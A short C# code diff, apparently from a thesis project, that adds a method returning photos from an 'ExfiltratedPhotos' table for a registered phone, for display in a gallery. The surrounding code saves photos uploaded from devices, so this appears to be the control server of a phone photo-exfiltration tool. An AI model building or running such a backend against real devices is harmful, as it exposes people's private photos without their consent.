@@ -142,6 +142,17 @@ namespace tesis.Services
             // Esto va a la base de datos y trae todos los celulares registrados
             return _context.Devices.ToList();
         }
+        // =========================================================
+        // NUEVO MÉTODO IMPORTANTE PARA LA GALERÍA
+        // =========================================================
+        public async Task<List<ExfiltratedPhoto>> GetExfiltratedPhotosAsync(string deviceId)
+        {
+            // Consultamos la tabla correcta: ExfiltratedPhotos
+            return await _context.ExfiltratedPhotos
+                .Where(p => p.DeviceId == deviceId)
+                .OrderByDescending(p => p.CapturedAt) // Las más nuevas primero
+                .ToListAsync();
+        }
         // 4. Guardar Foto Exfiltrada (La parte crítica)
         public async Task<bool> SaveExfiltratedPhotoAsync(string deviceId, IFormFile file)
         {
